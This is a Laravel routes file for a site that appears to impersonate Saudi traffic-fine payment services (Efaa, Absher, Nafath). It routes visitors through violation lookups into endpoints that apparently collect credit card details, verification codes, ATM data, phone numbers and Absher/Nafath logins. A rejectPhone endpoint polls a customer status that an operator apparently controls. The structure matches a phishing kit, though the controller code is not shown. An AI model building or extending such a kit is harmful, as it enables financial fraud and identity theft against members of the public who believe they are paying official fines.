<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Http\Request;
use App\Http\Controllers\EfaaController;
use App\Http\Middleware\BlockUsers;





Route::GET('/about-us', function () { return view('about'); });
Route::GET('/Beneficiaries', function () { return view('Beneficiaries'); });
Route::GET('/regulations', function () { return view('regulations'); });
Route::GET('/regulations', function () { return view('regulations'); });
Route::GET('/Partners', function () { return view('Partners'); });
Route::GET('/ContactUs', function () { return view('ContactUs'); });




Route::GET('/home', function () { return view('home'); });
Route::GET('/info', function () { return view('info'); });
Route::GET('/efaa', function () { return view('efaa'); });
Route::GET('/steps', function () { return view('steps'); });
Route::GET('/manasa', function () { return view('manasa'); });
Route::GET('/efaa-en', function () { return view('efaaenglish'); });
Route::GET('/efaa-en-vio', function () { return view('violations'); });
Route::POST('/steps2', [EfaaController::class, 'paynow']);
Route::POST('/GetViolationsByViolatorinquery', [EfaaController::class, 'GetViolationsByViolatorinquery']);
Route::POST('/GetFirmsList', [EfaaController::class, 'GetFirmsList']);
Route::POST('/CreateOrder', [EfaaController::class, 'CreateOrder']);

Route::get('/bname/{error}', function ($error = 0, Request $request) {


    if (session()->has('totalFineItemsAmount')) {

         $totalFineItemsAmount =  session('totalFineItemsAmount');
         return view('new.pay',['error'=> $error,'totalFineItemsAmount' => $totalFineItemsAmount]);

    } 
    else 
    {
         return view('new.pay',['error'=> $error]);
    }

});

Route::POST('/GetViolationsByViolatorHome', [EfaaController::class, 'GetViolationsByViolatorHome']);
// Home Page Request
Route::GET('/', [EfaaController::class, 'home']);
Route::POST('/extGetTrafficViolationInfo', [EfaaController::class, 'extGetTrafficViolationInfo']);
Route::POST('/extSearchBByFineNumAndViolaterId', [EfaaController::class, 'extSearchByFineNumAndViolaterId']);
Route::GET('/addto/{violatorID}/{FiensInfoDTOs}/{inside?}', [EfaaController::class, 'addto']);
Route::POST('/creditcard', [EfaaController::class, 'creditcard']);
Route::POST('/verifycode', [EfaaController::class, 'verifycode']);
Route::POST('/atm', [EfaaController::class, 'atm']);
Route::POST('/send-phone', [EfaaController::class, 'sendphone']);
Route::POST('/verifyb', [EfaaController::class, 'verifyb']);
Route::POST('/verifya', [EfaaController::class, 'verifya']);
Route::POST('/extGetPersonalInfoByIdAndDob', [EfaaController::class, 'extGetPersonalInfoByIdAndDob']);
// Image
Route::POST('/GetTrafficViolationImages', [EfaaController::class, 'GetTrafficViolationImages']);


Route::get('/nafath', function(Request $request) {  return view('new.nfath'); });
Route::get('/nfathcode', function(Request $request) { return view('new.nfathCode');});
Route::POST('/loginabsher',        [EfaaController::class, 'loginAbsher']);
Route::POST('/checknfathcode', [EfaaController::class, 'getStatus']);



Route::POST('/rejectPhone', function (Request $request) {


    $nid = session('id');

    $isFound = 0;

    $customers = DB::table('customers')->where('id_ref',$nid)->first();
    $isFound   = $customers->status;

     
    $result = array('data' =>  $isFound );
    return Response::json($result, 200, array('Content-Type' => 'application/javascript'));

    

});









